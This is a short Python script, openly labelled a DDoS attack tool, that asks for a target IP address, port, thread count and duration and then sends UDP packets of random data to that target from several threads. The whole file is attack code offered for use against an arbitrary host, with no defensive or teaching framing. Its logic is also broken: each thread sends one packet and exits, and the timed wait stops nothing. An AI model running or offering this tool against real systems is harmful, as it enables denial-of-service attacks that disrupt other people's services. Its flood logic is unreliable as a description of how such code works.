import socket
import struct
import random
import threading
import time

def send_udp_packet(target_ip, target_port):
    # Create a UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Generate random data to send
    data = struct.pack('!I', random.randint(1, 1000000))

    # Send the packet
    sock.sendto(data, (target_ip, target_port))
    sock.close()

def start_ddos_attack(target_ip, target_port, num_threads, duration):
    # Start multiple threads to send UDP packets
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=send_udp_packet, args=(target_ip, target_port))
        thread.start()
        threads.append(thread)

    # Wait for the specified duration
    time.sleep(duration)

    # Stop all threads
    for thread in threads:
        thread.join()

if __name__ == '__main__':
    # Get the target IP address and port from the user
    target_ip = input("Enter the target IP address: ")
    target_port = int(input("Enter the target port: "))

    # Get the number of threads and duration from the user
    num_threads = int(input("Enter the number of threads: "))
    duration = int(input("Enter the duration (in seconds): "))

    # Start the DDoS attack
    start_ddos_attack(target_ip, target_port, num_threads, duration)